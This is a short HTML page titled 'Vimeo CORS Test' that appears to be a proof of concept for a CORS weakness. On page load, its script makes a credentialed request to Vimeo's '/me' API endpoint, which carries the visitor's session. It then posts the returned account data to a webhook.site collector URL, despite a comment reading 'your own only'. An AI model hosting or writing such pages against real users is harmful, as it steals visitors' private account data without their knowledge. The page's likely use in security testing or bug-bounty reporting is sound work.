<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Vimeo CORS Test</title>
</head>
<body>
  <h1>Testing Vimeo CORS</h1>
  <script>
    fetch("https://api.vimeo.com/me", {
      credentials: "include"
    })
      .then(res => res.json())
      .then(data => {
        console.log("My Vimeo Data:", data);

        // Optional: Send to webhook (your own only)
        fetch("https://webhook.site/your-webhook-id", {
          method: "POST",
          body: JSON.stringify(data),
          headers: { "Content-Type": "application/json" }
        });
      });
  </script>
</body>
</html>
